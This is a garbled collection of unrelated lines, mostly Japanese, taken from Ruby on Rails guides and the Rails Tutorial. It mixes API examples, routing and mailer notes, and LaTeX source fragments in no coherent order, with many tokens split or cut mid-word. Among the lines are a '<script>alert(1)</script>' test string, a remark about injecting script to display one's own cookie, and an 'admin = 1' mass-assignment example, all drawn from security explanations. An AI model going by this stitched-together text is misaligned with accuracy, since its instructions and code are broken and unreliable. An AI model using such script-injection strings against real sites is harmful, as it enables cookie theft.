この とき 、 英語 式 の CUT も フランス 式 の TUC も 満場 一致 と な ら ず 、 両者 の 妥協 案 と し て UTC と い う 略語 が 採用 さ れ ま し た 。
( 演習 は \ href { http://en ▖wikipedia ▖org/wiki/ Boss _( video_gaming ) # Miniboss } { 中 ボス } で す ) 。
" product " ▖ camelize    # =>  " Product "
create    app/views/welcome
#  Use  Uglifier   as  compressor   for   Java Script   assets
スクリーン キャスト   ( 英語 )   は  \ href { http://railstutorial ▖org / }{ Ruby   on   Rails チュートリアル Web サイト } ( 英語 版 ) で 購入 でき ま す 。
コンパイル さ れ た アセット は 、 ` config ▖ assets▖ prefix ` で 指定 さ れ た 場所 に 保存 さ れ ま す 。
# => " < script> alert ( 1 ) < / script > "
Rails の コンポーネント 名 は 語 の 間 に スペース を 1 つ 置 く 表記 を 正式 な もの と する   ( 例 :  " Active   Support " )
╼╼    %  subsection   modeling _ users   ( end ) ╼╼    \ subsection { マイクロ ポスト の モデル 設計 } %  ( fold) ╼    \ label{ sec : modeling_ demo_microposts}╼╼
file_field_tag  'attachment'
常 に と い う わけ で は あ り ま せ ん が 、 変更 を 過去 の 安定 版 の メンテナンス 用 に バック ポート でき る と よ い 場合 が あ り ま す 。
  else
    </p>
= > {:user= >{: name => " Michael   Hartl " ,  :email = > " mhartl@example ▖ com " } }
Postgre SQL データベース の メモリー 使用 量 が 上限 に 達 し た 場合 は 、 ` statement_ limit ` の 値 を 小さ く する か Prepared   Statements を オフ に し て くださ い 。
config/ routes▖rb             #  YES
この コード を 自分 の Web アプリケーション の 適当 な 場所 に 手動 で 注入 する と 、 その ページ に 含 ま れ て い る 自身 の cookie が 表示 さ れ る の が わか り ま す 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/integer/multiple▖ rb ` で す 。
` app/assets/images ` に 置 か れ て い る 画像 アセット へ の URL を 算出 し ま す 。
       body :  email ▖ body
In   Chapter   \ ref { cha : sign_up } , this   will   become  the  user   signup   page ▖
この 種 の ミス は まさに 、 テスト で キャッチ す べ き エラー で す 。
*  `finisher_hook ` :  アプリケーション の 初期 化 プロセス 完了 後 に 実行 さ れ る フック を 提供 し 、 アプリケーション や railties や エンジン の ` config▖ after_ initialize ` ブロック も すべて 実行 し ま す 。
  @@author_ class▖ constantize
逆 に 、 バリデーション を 行な う 条件 を 複数 定義 し た い 場合 、 ` Array ` を 使用 でき ま す 。
メール ヘッダー の フィールド 名 と 値 の ペア を ハッシュ に まとめ て 渡 す こと も でき ま す し 、 ` headers [ :field_ name ]  =  'value '` の よう に 呼び出 す こと も でき ま す 。
* `: polymorphic ` 関連 付け と 併用 する こと は でき ま せ ん 。
これ は 、 作成 する とき に 渡 す オプション と スコープ ブロック で 簡単 に カスタマイズ でき ま す 。
###  モデル を 生成 する
最終 的 な フィード の 実装 は やや 込み入 っ て い る ため 、 細か い 部品 を 1 つ ずつ 確かめ ながら 導入 し て い き ま す 。
*   「 控えめ な Java Script 」 に つ い て
#  Use   SCSS   for  stylesheets
#### file_field_tag
ファイル の 変更 が 終わ っ た の で 、 マスター ブランチ に この 変更 を \emph { マージ   ( merge) }  し ま す 。
* `load_environment_config `   現在 の 環境 に ` config/ environments ` を 読み込 み ま す 。
大 文字 小 文字 を 無視 する オプション
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/object/to_query ▖ rb ` で す 。
リスト \ ref{ code : signup _ form } で 定義 し た フォーム を 理解 する ため に 、 小さな コード に 分け て 考え て み ま しょ う 。
コマンドライン で 以下 の よう に 記憶 トークン を 生成 する こと で 、 上 の テスト が パス する よう に な り ま す 。
*   ユニーク な id を 生成 し て ` X - Request - Id ` ヘッダー に 設定 し ま す ▟ ` ActionDispatch : : Request #uuid ` メソッド も 同一 の id を 利用 し て い ま す 。
*  ** 外部 キー * * -  この カラム は   ` テーブル 名 の 単数 形 _ id `   に する 必要 が あ り ま す   ( 例   `item_ id ` 、 `order _ id ` )
ディレクトリ の 移動
この 節 で の 目的 は 、 簡単 に 消え る こと の な い ユーザー の モデル を 構築 する こと で す 。
  $ rails   generate  controller   StaticPages   home  help╼  $ rails   destroy    controller   StaticPages   home  help
詳細 に つ い て は 、 [ gem の Readme ] (https://github▖ com/rails/rails -html - sanitizer ) を 参照 し て くださ い 。
デフォルト は ` 1 ` で す 。
リスト \ ref{ code : from _users _ followed_ by _final } を も っ て 、 ステータス フィード の 実装 は 完了 で す 。
C ▖ descendants # =>  [ B ,   A ]
既存 の ` : nodoc: ` 指定 は むやみ に 変更 し な い で くださ い 。
account
% w ( a b  c  d ) ▖fifth # => nil
" Admin : : Hotel : : ReservationUtils " ▖ deconstantize # => " Admin : : Hotel "
    "# { id } -#{ name ▖ parameterize} "
Action Controller : : TestCase▖ class_eval   do
###  ビュー を オーバーライド する
    has_many  : orders ,   before_ add : : check _credit_ limit
\ kode { provide } 関数 は content_ for の 代替 で す 。
####  JRuby プラットフォーム で My SQL データベース を 使用 する
\ kode {content\_tag } を 使 っ て レイアウト の 中 に \ kode {flash } を 埋め込 む
続 い て 、 リスト \ ref{ code : new_ readme } の 内容 を \ kode { README ▖ md } に 入力 し ま す 。
User メイラー 内 の 呼び出し で は 、 \ kode {@user } が \ kode {self } に 変更 さ れ て い る 点 に も ご 注目 くださ い 。
マイクロ ポスト の \emph { マイクロ } と い う 名前 に ふさわし く 、 何 ら か の 方法 で 文字 数 制限 を 与え て み ま しょ う 。
特定 の 条件 で は バリデーション を 行な う   * * べき で な い * *   場合 は 、 `:unless ` オプション を 使用 し ま す 。
README ▖ rdoc
これ ら は 同様 に 動作 し ま す 。
NOTE :   前述 の とおり 、 コード に パッチ を 当て る 際 に は 、 ドキュメント も それ に 対応 し て 適切 に 書 か れ る 必要 が あ り ま す 。
\ label{ fig :user_microposts_mockup}}╼\end { figure} ╼╼    \ subsection { マイクロ ポスト の 描画 }  %  ( fold) ╼    \ label{ sec : ren dering _microposts}╼╼Our plan   is   to   display  the 
計算
与え られ た 文字 列 に ` html_safe ` メソッド を 適用 する こと で 、 安全 な 文字 列 を 得 る こと が でき ま す 。
password _field(:login ,  : pass )
  ( scaffold で 自動 生成 さ れ る コード は 冗長 で 紛らわし い の で 除 い て あ り ま す ) 。
'ssl_error '▖ humanize # =>  " SSL  error "
         headers [ " X - SMTPAPI - CATEGORY " ]  = @bu siness▖ code
キー が 重複 し て い る 場合 、 いずれ か の 値 が 優先 さ れ ま す 。
   def  self ▖ delivering _email ( message)
これ は リスト \ ref{ code : home_ page _ passing } で 使用 さ れ て い ま し た 。
- 21 ▖ordinal   # => " st "
その 代わり に 、 この 作業 に 必要 な データ   ( 有効 化 トークン や 有効 化 ステータス など )   を User モデル に 追加 する こと に し ま す 。
重複 する メール アドレス 拒否 の テスト   (  \failing   )   { 5 } { / 5 } { 6 } test/models/user_test ▖ rb { / 6 }
Strong   Parameters を 使用 する こと で 、 \emph { 必須 } の パラメータ と \emph { 許可 さ れ た } パラメータ を 指定 する こと が でき ま す 。
同じ 日 が 行き先 の 月 に な い 場合 、 その 月 の 最後 の 日 が 返 さ れ ま す 。
この 章 の 終わり まで に 、 最後 の リンク を 除 き 全て 実装 し ま す 。
*   動的 な メソッド は 、 `find_ by _▖▖▖` と `find_ by _▖▖▖ ! ` を 除 い て 非 推奨 と な り ま し た 。
この よう な 場合 を サポート する ため に 、 Active   Support で は ` config/initializers/inflections ▖rb ` の 頭字 語 を 指定 する こと が でき ま す 。
` has _one ` 関連 付け に オブジェクト を アサイン する と 、 外部 キー を 更新 する ため に その オブジェクト は 自動 的 に 保存 さ れ ま す 。
HTTP / 1 ▖ 1   200   OK   Server :   Cowboy
###  他 の gem と の 依存 関係
フィールド に どの よう な 値 が あ る か を 問い合わせ る の に 使用 さ れ る 、 特定 の モデル オブジェクト の 外側 に フォーム を 1 つ と スコープ を 1 つ 作成 し ま す 。
    flash [ : notice ]  =  " Comment   has   been   created ! "
class   Essay  <  ActiveRecord : : Base
これ に よ り 、 キー の 内容 に よ っ て 異な っ た CSS クラス を 適用 さ せ る こと が でき 、 メッセージ の 種類 に よ っ て スタイル を 動的 に 変更 さ せ る こと が でき ま す 。
resources   : users ,   do
###   最大 値
足跡 を ほぼ 残 さ な い よう に する ため 、 Active   Support は デフォルト で は 何 も 読み込 み ま せ ん 。
上 で 説明 し た こと を User モデル に 実装 する と リスト \ ref{ code :user_ model_activation_code } の よう に な り ま す 。
#### ` reverse_merge ` と ` reverse_merge !
上 で 実際 に 使用 さ れ る SQL 文 は 以下 の よう に な り ま す 。
と 書 く と うま く 動 き ま せ ん 。
\ chapter { ユーザー の モデル を 作成 する } %  ( fold) ╼\ label{ cha : modeling _ users }╼╼
この 章 に は 多く の 話題 が 盛り込 ま れ て い ま す が 、 一 度 読 ん だ だけ で 理解 する 必要 は まったく あ り ま せ ん 。
上 の エラー が 発生 する よう な 場合 は 、 ` database▖yml ` の ` pool ` オプション の 数値 を 増や し て 接続 プール の サイズ を 増や す こと で 対応 でき ま す 。
この メソッド は 、 ` : attribute ` の すべて の エラー の 配列 を 返 し ま す 。
*  `assets: precompile : primary ` および ` assets: precompile : all ` は 削除 さ れ ま し た 。
リスト \ ref{ code :user_ model_remember } で は 、 明示 的 に \ kode {User } を プレフィックス と し て 、 新し い トークン や ダイジェスト の クラス メソッド を 定義 し ま し た 。
before フィルター を 使 っ て 、 認可   ( アクセス 制御 )   を 実現 し た
この ため 、 \ kode { log _ in_as } で は テスト の 種類 を 検出 し て 、 それ に 応 じ た ログ イン を 行え る よう に する 必要 が あ り ま す 。
もちろん 、 映画 「 \ href { http://www ▖imdb ▖ com/title/tt 0499549 /}{ アバター } 」 を 見 た 人 に は こんな 解説 は 不要 で しょ う 。
たとえば 、 ` app/assets` 、 ` lib/assets` 、 また は ` vendor/assets ` の 下 に あ る `stylesheets ` の 下 に あ る スタイル シート ファイル に リンク し た い 場合 は 以下 の よう に し ま す 。
#  =>  Tue ,   09   Aug  2011   23 : 21 : 11   UTC   + 0 0 : 0 0
` resources   : photos ` と い う ルーティング を 例 に 取 っ て み ま しょ う 。
フォロー 一覧 も フォロワー 一覧 も 動 く よう に な っ た の で 、 この 振る舞い を 検証 する ため の 2 つ の 統合 テスト を 書 い て い き ま しょ う 。
555 1234 ▖ to_s(:phone )
エンジン に あ る ` lib/blorgh ▖ rb ` に 以下 の 行 を 追加 し ま す 。
  >>  Rails ▖env ▖ production ?
ユーザー に ログ イン する
Click   on  the  link  below to   activate  your   account : ╼╼http://rails -tutorial - c 9 - mhartl▖ c 9 ▖ io/account_activations/╼fFb_F 94 mgQtmlSvRFGsITw/edit ?
設定 が 完了 し た ら 、 いよいよ ユーザー ログ イン の コード を 書 き 始め ま しょ う 。
これ は リスト \ ref{ code : delete_destroy_ test } で 使用 さ れ て い ま し た 。
Contact ページ の テスト   (  \failing   { 5 } { / 5 })   { 6 } test/controllers/static _ pages_controller_test ▖ rb { / 6 }
この とき 、 システム 環境 に よ っ て は 以下 の 警告 が 出力 さ れ る こと が あ り ま す 。
たとえば 、 Rails は 「 REST 」 と い う 設計 思想 の 重要 性 を いち早く 理解 し 、 対応 し た フレームワーク の １ つ で す   ( REST に つ い て は 後ほど 解説 し ま す ) 。
< li >`: port` -  メール サーバー が 万一 ポート 25 番 で 動作 し て い な い 場合 は ここ で 変更 する ▟</ li >
最後 の ブロック の 例 と し て 、 単体 テスト に も 目 を 向け て み ま しょ う   ( リスト \ ref{ code : home_base_title_ spec } ) 。
date▖ beginning _ of_minute  # =>  Mon   Jun   0 7   19 : 55 : 0 0   + 0200   2010
第 3 版   目次
*   Turbolinks  gem
created_at:   " 2013 - 0 3 - 11   20 : 45 : 19 " ,   updated_at:   " 2013 - 0 3 - 11   20 : 45 : 19 " ,
|                     |   201                | : created                         |
*   バック グラウンド で の ジョブ 実行 方法
Using   Listing   \ ref{ code :string _ shuffle_two}   as   a   guide ,   add   a   \ kode {shuffle}   method  to  the  \ kode { String }   class ▖
####  CDN の キャッシュ の 動作 を カスタマイズ する
コントローラ の コード に ERB を 混在 さ せ る と 、 Rails の MVC 指向 が 崩 さ れ る だけ で な く 、 開発 者 が プロジェクト の ロジック を 追いかけ る こと が 困難 に な っ て しま い ま す 。
# = >  123   55 5   123 4
場合 に よ っ て は ` has_many ` で 使用 さ れ る クエリ を カスタマイズ し た く な る こと が あ り ま す 。
実 は 、 Ruby   で は 丸括弧 は 使用 し て も し な く て も 構 い ま せ ん ▟ 以下 の 2 つ の 行 は 同等 で す 。
最初 に 、 ` author_ name ` テキスト フィールド を エンジン の パーシャル ` app/views/blorgh/articles/_form ▖html ▖erb ` に 追加 する 必要 が あ り ま す 。
正規 表現 は 謎め い て 見え る が 非常 に 強力 で あ る
この コード は Rails と Ruby と SQL が 複雑 に 絡み合 っ て い て 厄介 で す が 、 ちゃんと 動作 し ま す 。
   belongs_to  : part
#  Time▖ current ▖ advance ( months :   4 ,   years :   5 )   と 等価
Rails は 、 フレームワーク の 読み込み と すべて の gem の 読み込 み が 終わ っ て から 、 イニシャライザ の 読み込み を 開始 し ま す 。
####  date_select
推奨 さ れ る 方法 が 強調 さ れ る よう セクション の 順序 に 注意 し 、 必要 で あ れ ば 順序 を 入れ 替え る こと 。
       create    Gemfile
#### image_url
` isolate_namespace ` が 呼び出 さ れ な い と 、 エンジン の ヘルパー が アプリケーション の コントローラ に インク ルード さ れ て しま う 可能 性 が あ り ま す 。
#   Ignore  other  unneeded files ▖
デフォルト で は 英語   ( " en " )   テンプレート が 使用 さ れ ま す 。
これ は リスト \ ref{ code : sample_microposts } で 使用 さ れ て い ま し た 。
これ は 一般 に フロント エンド 開発 者 コミュニティ で ベスト プラクティス で あ る と 見な さ れ て い ま す が 、 ここ で は もう 少し 違 う 角度 から 説明 し た い と 思 い ま す 。
実際 、 この 時点 で は コントローラ は Application ひと つ しか あ り ま せ ん ▟ 次 の コマンド を 実行 する と 、 現在 あ る コントローラ を 確認 でき ま す 。
イニシャライザ と は 、 アプリケーション の ` config/initializers ` ディレクトリ に 保存 さ れ る Ruby ファイル の こと で す 。
この 節 で 参考 まで に 示 し た コード は それ なり に 高度 な の で 、 今 すぐ 理解 でき る よう に な る 必要 は あ り ま せ ん 。
#### ` has_many ` の スコープ に つ い て
# =>  Tue ,   0 8   Jun  2010   0 0 : 0 0 : 0 0   + 0000
create      app/assets/stylesheets/blorgh/articles ▖css
上 の コード で テスト を 実行 し て み ま す 。
` users ` テーブル に 主 キー と し て ` id ` カラム が あ り 、 その 他 に ` guid ` カラム も あ る と し ま す 。
  <%=   simple_format ( article ▖ text )  %>
Rails は 指定 どおり コントローラ を 作成 し 、 関連 ファイル や ルーティング も 設定 し て くれ ま す 。
      #  以下 の 行 に よ っ て ` article _ id ` と い う 整数 カラム が 追加 さ れ る
ブランチ を 適用 し た ら テスト し て み ま す 。
* `touch `
次 に リモート の GitHub リポジトリ と Heroku の 本番 サーバー に プッシュ し ま す 。
その 他 の 場合 は 、 \ href { http://installrails▖ com/}{ InstallRails▖ com}  ( \ ref{ sec : up_and _running } )   の 指示 に 従 っ て Git を システム に 導入 し て くださ い 。
デフォルト で は 配信 が 行 わ れ ま す ▟ 機能 テスト など で 配信 を 一時 的 に オフ に し た い 場合 に 便利 で す 。
( この コード の テスト は \ ref{ sec : updating_ deleting _ exercises } の 演習 と し ま す ) 。
\ kode {Micropost } クラス に おけ る 継承 。
条件 文 を 2 つ 以上 含め た い 場合 は 、 \ kode {elsif} ( \kode {else }  + \ kode {if} )   と い う 文 を 使 い ま す 。
ETag は キャッシュ の 有効 性 を 検証 する の に 使用 さ れ ま す 。
` raw ` ヘルパー は 、 内部 で ` html_safe ` を 呼び出 し ま す 。
利便 性 の ため に 、 ` class_attribute ` は 、 インスタンス の reader が 返 す もの を 「 二 重 否定 」 する インスタンス 述語 も 定義 さ れ ま す 。
*  `config▖ log _ level ` は 、 Rails の ログ 出力 を どの ぐらい 詳細 に する か を 指定 し ま す 。
   user  =  User ▖find_ by _ token ( params [ : token ] )
#   ユーザー 変数 を 作成 する ため の コード に 置き換え る 。
上 の コード から 以下 が 生成 さ れ ま す 。
リスト \ ref{ code : generating _ pages } で 生成 さ れ る StaticPages コントローラ
これ は リスト \ ref{ code :micropost _validity_ test } で 使用 さ れ て い ま し た 。
\ kode { full \_title } ヘルパー を 定義 する
この ルーティング ファイル は ルーター の 実装 を 受け持ち   ( 図 \ ref { fig : mvc_ detailed } ) 、 URL と Web ページ の 対応 関係 を 定義 し ま す 。
     by   Michael   Hartl
0 1 : 0 5 : 42 " ,   updated_at:   " 2013 - 0 3 - 1 1   0 1 : 0 5 : 42 " >
この 順序 で 計算 し て い る こと は 、 特に 月 を 計算 する 時 に 重要 で す 。
この パス は 、 マニフェスト ファイル から の 相対 パス と し て 指定 する 必要 が あ り ま す 。
関連 する コントローラ で 以下 の コード を 使用 する こと で 、 コントローラ 固有 の スタイル シート や Java Script ファイル を その コントローラ だけ で 使用 でき ま す 。
サイン イン し て い る ユーザー 用 に リンク を 変更 する 。
この コード は リスト \ ref{ code : destroy _ forget } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
でき る だけ 早 く アップグレード を お 願 い し ま す 。
##### ` collection▖ clear `
{ 0 } 表 12 ▖ 1 { / 0 }   { 1 } ユーザー と 能動 的 関係 の 関連 付け に よ っ て 使え る よう に な っ た メソッド の まとめ   ( { / 1 }
さらに 、 サイド バー に は ユーザー プロファイル 画像 の リンク を 格子 状 に 並べ て 表示 する 予定 で す 。
# => < input type =" text "   id= " login_pass "   name =" login [ pass ] "   value =" #{@ login ▖ pass} " />
その 理由 は 、 footer タグ と する 方 が 読み 手 に と っ て 意味 が 明確 で あ る の と 、 ▖ footer クラス は Bootstrap で 使用 する ため で す 。
ユーザー の フォロー 解除 を テスト する 。
    INNER   JOIN  comments  ON   comments▖ article _ id   =  articles ▖id
ハッシュ で は シンボル を キー と し て 使 う こと が 一般 的 な の で 、 Ruby   1 ▖ 9 で は この よう な 特殊 な 場合 の ため の 新し い 記法 を サポート し て い ま す 。
ちなみ に 、 \ kode {private } キー ワード 以降 の コード を 強調 する ため に 、 \ kode {user_ params } の インデント を 1 段 深 く し て あ り ま す 。
現在 の Action   Mailer で は 、 `mail ` メソッド を 呼び出 す と 2 種類 の テンプレート   ( テキスト および HTML )   が あ る か どう か を 探 し 、 ` multipart/alternative ` 形式 の メール を 自動 生成 し ま す 。
       format▖html { ren der  'another_template '  }
\ kode { log \_ in\_as } ヘルパー を 追加 する
上 の コード を 使用 する と 、 テスト は   \ passing   に な る はず で す 。
|                     | 504                | :gateway_timeout                  |
# =>  Ruby   on   Rails
設定 オプション の 完全 な 説明 に つ い て は 「 Rails アプリケーション を 設定 する 」 ガイド の [ Action   Mailer を 設定 する ] ( configuring ▖ html # action - mailer を 設定 する ) を 参照 し て くださ い 。
class   Library  <  ActiveRecord : : Base
準備 が でき た ら 、 本番 環境 へ デプロイ し て み ま しょ う 。
    is   the   sample  application   for   the tutorial ▖
メイラー に は 「 アクション 」 と 呼 ば れ る メソッド が あ り 、 メール の コンテンツ を 構成 する の に ビュー を 使用 し ま す 。
一方 で 、 ルート URL へ の リンク は \emph { 2 つ } ある こと を 思い出 し て くださ い   ( 1 つ は ロゴ に 、 もう 1 つ は ナビゲーションバー に あ り ま す ) ▟ この よう な と k
リスト \ ref{ code :feed_second_ cut } で コード を 若干 修正 し 、 フィード を リファクタリング する こと から 始め ま しょ う 。
|                     |  503                | :service_unavailable             |
Guard を 初期 化 し 、 RSpec と 一緒 に 動作 する よう に し ま す 。
疑問 符 ` ( ? ) ` を パラメータ で 置き換え る スタイル と 同様 、 配列 に よ る 条件 中 で キー / 値 の ハッシュ を 指定 でき ま す 。
アカウント 有効 化 は   Active   Record オブジェクト で は な い が 、 セッション の 場合 と 同様 に 、 リソース で モデル 化 でき る 。
つまり 、 ブラウザ が CD N 上 の アセット を リクエスト し て キャッシュ が 見つか ら な い 場合 、 オンデマンド で サーバー から アセット ファイル を 取得 し て キャッシュ する と い う こと で
        route     resources  :microposts
正し い モデル を 見つけ 出 す 方法 の 1 つ は 、 Web アプリケーション に おけ る \emph { following } の 動作 を どの よう に 実装 する か を じっくり 考え る こと で す 。
これ は リスト \ ref{ code :gravatar _option } で 使用 さ れ て い ま し た 。
ここ で は ` articles/new ` と い う テンプレート が あ る はず だ と 言 っ て い ま す 。
    e ▖preventDefault ( )
詳細 は [ アメリカ 英語 と イギリス 英語 の スペル の 違い ] ( http://en ▖wikipedia ▖org/wiki / American_and _ British_ English _spelling_differences )   ( 英語 )   を 参照 し て くださ い 。
get  '* pages',  to :  ' pages # show ',   format :  false
*   ドキュメント に 適切 な 記載 が あ る か 。
\ kode {flash } 変数 を 使 う と 、 一時 的 な メッセージ を 表示 でき る よう に な る
この 機能 を 使用 し て 、 SCSS を 以下 の よう に 書き直 す こと が でき ま す 。
    <ul >
デフォルト は ` / usr/sbin/sendmail ` で す 。
パス に スラッシュ ` / ` が 含 ま れ て い る と 、 Rails に よ っ て この ビュー は 異な る コントローラ の 配下 に あ る と 認識 さ れ ま す 。
Action   View   は その 後 レスポンス を 実際 の Web ページ に まとめ る 役割 を 担 い ま す 。
admin = 1
#   アプリケーション へ の すべて の アクセス を 強制 的 に SSL に し 、 Strict - Transport - Security と セキュア クッキー を 使用 する
この サイクル の こと を 「 Red/ Green /Refactor 」 と 呼 び ま す 。
### ` has _one ` 関連 付け
config▖ active_ record ▖ auto _explain_threshold_ in_seconds   =   0 ▖ 5
{ a :   1 } ▖ with _indifferent_access ▖ except ( " a " )  # => {}
この 節 で 説明 する アイディア の 多く は 、 最初 なかなか 意図 が 読み取れ な い こと も あ る と 思 い ま す ▟ 複雑 な データ モデル も 、 腑 に 落ち る まで 時間 が かか る こと で しょ う 。
句読点 や 記号 の 用法 は 常識 に 従 う こと 。
これ ら の コード は 等価 で は あ り ま す が 、 \ kode {assert_no_difference } を 使 う 方 が 明瞭 で 、 Ruby の 慣習 的 に も 正し い で す 。
Rails の ビュー に は 命名 規則 が あ り ま す 。
" name " ▖ humanize                         # => " Name "
   url:  <%=   ENV [ ' DATABASE _ URL ']  %>
この メソッド の 内部 で は スタイル シート へ の パス 作成 に ` stylesheet_link_tag ` が 使用 さ れ て い ま す 。
NOTE :   この メソッド は ` collection▖ concat ` および ` collection ▖push ` の エイリアス で す 。
この テスト は 、 空 で は な い \ kode {user_ id } を 使用 し て \ kode {Micropost ▖ new } を 呼 ぶ と 、 mass   assignment  security  error 例外 が 発生 する こと を 確認 し て い ま す 。
システム 環境 に よ っ て は 、 データベース を リセット し た 後 に もう 一 度 prepare を 実行 し て お く 必要 が 生じ る こと が あ り ま す 。
この 節 で は 、 後 に 動的 な ページ を 作成 する ため の 準備 と し て 、 最初 に Rails の \emph { アクション } と \emph { ビュー } に 静的 な HTML だけ を 含め た もの を 作成 し ま す
プルリクエスト に 自分 で コメント を 追加 し て み て も よ い で しょ う 。
###  デフォルト 設定 を 定義 する
サンプル アプリケーション の 場所 は 、 たとえば 次 の よう に 表記 さ れ ま す 。
*  `collection▖ clear `
` Model ▖find ` で 実行 さ れ る SQL に ` LIMIT ` を 適用 し た い 場合 、 リレーション で ` limit ` メソッド と ` offset ` メソッド を 使用 する こと で ` LIMIT ` を 指定 でき ま す 。
実際 の アプリケーション コード を リスト \ ref{ code :user_create_action } に 示 し ま す   ( \kode {redirect\_to }   メソッド に 注目 し て くださ い ) 。
|                     |  424                | :failed_dependency                |
上 の 原則 に 従 っ て 、 リスト \ ref{ code :persistent_sessions_test } の コード は 以下 の よう に 書 か れ て い ま す 。
この パターン は 、 user   オブジェクト の 関連 付け を \emph { 経由 し て } マイクロ ポスト を 作成 する 標準 的 な 方法 で す 。
rake ( " db : migrate " )
Date▖ new (2010 ,   12 ,   23 ) ▖ change ( year :   2011 ,  month :   11 )
初期 化 処理 が ここ まで 進 む と 、 railties や エンジン イニシャライザ は すべて 起動 し て い ま す 。
ルート URL   ( Home ページ )   に GET リクエスト を 送 る
after_bun dle  do
なお 、 ` ActiveRecord ` は Ruby モジュール 名 だ が 、 Active   Record は ORM を 指 す 。
{ a :   1 } ▖ assert_valid _keys(:a)   #   パス する
この ガイド で は 、 Active   Record を 使用 し て データベース から データ を 取り出 す ため の さまざま な 方法 に つ い て 解説 し ま す 。
###  リモート   `< script>`  タグ に CSRF 保護 を 実施
  >>   1 ▖ year ▖ from _now
さらに 、 \ kode { home▖html ▖erb } ファイル が 変更 さ れ る と   \ kode {static _ pages_spec ▖ rb } が 自動 的 に 実行 さ れ る よう に Guard を 設定 する こと も でき ま す 。
# => {" "  => nil ,   " a "  => : a ,   " 1 "   = >   1 }
config ▖ assets▖css_ compressor   = :yui
nothing   to  commit   ( working   directory   clean )
なお 、 String クラス の 内部 で は 、 メソッド や 属性 を 呼び出 す とき の \ kode {self ▖ } も 省略 可能 で す 。
この 点 に つ い て は この 後 で カバー し ま す ) 。
以下 の Active   Record の 例 で は 、 ` Module #qualified_const_set ` で この メソッド を 使用 し て い ま す 。
( データベース の マイ グレーション の 詳細 に つ い て は \ ref{ sec : database_migrations } 以降 で 説明 し ま す ) 。
この セクション で は 、 ジョブ の 作成 方法 と ジョブ の 登録   ( enqueue )   方法 を 手順 を 追 っ て 説明 し ま す 。
\ kode {header } タグ の 内側 に は 2 つ の \ kode {div } タグ が あ り ま す 。
id :   [ 1 , 2 , 3 ] )
つまり 、 ローカライズ 版 ビュー が な く て も 動作 し ま す が 、 ローカライズ 版 ビュー が あ れ ば それ が 使用 さ れ ま す 。
参考 まで に 、 リスト \ ref{ code :sendgrid_config } で 使用 する Heroku の 環境 変数 を 表示 する に は 、 以下 の コマンド を 実行 し ま す 。
この 状態 で フォーム を 送信 する と 、 既に お 馴染み の 以下 の エラー が 表示 さ れ ま す 。
両者 の サービス は 非常 に 似通 っ て い ま す ▟ どちら も 、 Git リポジトリ の ホスティング と 共同 作業 を 行 う こと が でき 、 リポジトリ の 表示 や 検索 を 行 い やす く し て くれ ま す 。
### `belongs_to ` 関連 付け の 詳細
number_to_phone ( 12355 5 1234 )  # = >  123 - 555 - 123 4
{ 0 } 図 8 ▖ 6 { / 0 }   { 1 } フラッシュ メッセージ が 消え ず に 残 っ て い る 例 { / 1 }
|  key     | key_ len  |  ref    |  rows |   Extra   |
|                     |  510               | : not _extended                    |
`: counter_cache ` オプション は 、 従属 し て い る オブジェクト の 数 の 検索 効率 を 向上 さ せ ま す 。
" " ▖ duplicable ?     
Spork は 環境 を \emph { 1 回 だけ } 読み込 み 、 今後 実行 する テスト の ため の プロセス を 管理 し ま す 。
対象 ブランチ に 切り替え て 変更 を 適用 し ま す 。
#  config ▖ assets▖precompile   + =  % w (  search ▖ js  )
生成 さ れ た HTML フォーム を リスト \ ref{ code : login_form_html } に 示 し ま す 。
format ▖ js が ` respond_to ` ブロック の 中 に あ る 点 に ご 注目 くださ い ▟ これ に よ っ て 、   コントローラ が Ajax リクエスト に 応答 でき る よう に な り ま す 。
出力 を 見やす く する ため に フラグ を オーバーライド する こと も でき ま す   ( ただし オプション の 意味 を 十分 理解 し た うえ で で す が ) 。
###  フィードバック を 受け取 る
具体 的 な 方法 に つ い て は この 章 の 最後 で 説明 し ま す 。
さらに 、 ジョブ 管理 フレームワーク を 切り替え る 際 に ジョブ を 書き直 さ ず に 済 み ま す 。
この オプション が true に な っ て い る と 、 アプリケーション の アセット が ` config ▖ assets▖precompile ` に 記載 さ れ て い る とおり に すべて 読み込 ま れ て い る か どう か を チェック し ま す 。
上 の ルーティング は ブラウザ から の `/photos/ 12 ` パス に マッチ し 、 ` Photos ` コントローラ の ` show ` アクション に 割り当て られ ま す 。
number_ with _precision ( 111 ▖ 2345 )       # = >   11 1 ▖ 23 5
#   Cache - Control を 使用 する テスト で 静的 アセット サーバー を 構成 し 、 パフォーマンス を 向上 さ せ る
*  ` joins `
$  rails  console
最後 に 、 あらゆる マイクロ ポスト は ユーザー の id を 持 っ て い る べ き な の で 、 \ kode {user \ _ id } の 存在 性 の バリデーション に 対 する テスト も 追加 し ま す 。
この 代入 演算 子 は 、 \ kode {@ current_user } が 未 定義 の 場合 に のみ 、 \ kode {@ current_user } インスタンス 変数 に 記憶 トークン を 設定 し ま す
    has_many  : line _items
ユーザー 登録 に 成功 する と 、 データベース 上 に ユーザー が 追加 、 プロフィール ページ に リダイレクト 、 ウェルカム メッセージ の 表示 と い っ た 順 で 処理 が 進 む
ただし 、 上 の よう な 命名 は 単なる 慣習 に 過ぎ ま せ ん ▟ 実際 、 コマンドライン 上 で 以下 の よう な スネーク ケース の コントローラ 名 を 入力 し て も 、
  #▖▖▖
d ▖ advance ( months :   1 ,  seconds :   1 )
A   generalized  \kode {authenticated ? } 
= > #<Blorgh : : Article   id :   1   ▖ ▖▖
  @user  =  user
最後 に 、 Rails   に は 、 非常 に 熱心 で 多様 な コミュニティ が あ り ま す 。
パイプライン の アセット は 、 アプリケーション 内 の ` app/assets` 、 ` lib/assets` 、 ` vendor/assets ` の 3 つ の ディレクトリ の いずれ か に 置 く こと が でき ま す 。
self を 省略 し た 結果 を リスト \ ref{ code : test _domain_host } に 示 し ま す 。
詳細 に つ い て は ` Date▖_parse ` の ドキュメント を 参照 し て くださ い 。
=>  " foobar "
たとえば 、 `@review▖title ` を 何 の 工夫 も な く その まま HTML に 式 展開 する よう な こと は 絶対 に す べ き で は あ り ま せ ん 。
つまり 、 ` Date▖ today ` が `Date▖ yesterday ` と 等し く な る こと が あ り え る と い う こと で す 。
この 節 で は 、 ユーザー に ログ イン を 要求 し 、 かつ 自分 以外 の ユーザー 情報 を 変更 でき な い よう に する セキュリティ モデル を 構築 し ま しょ う 。
    @user  =  User ▖find ( params [ : id ] )
     create_table  : account_ histories  do  | t |
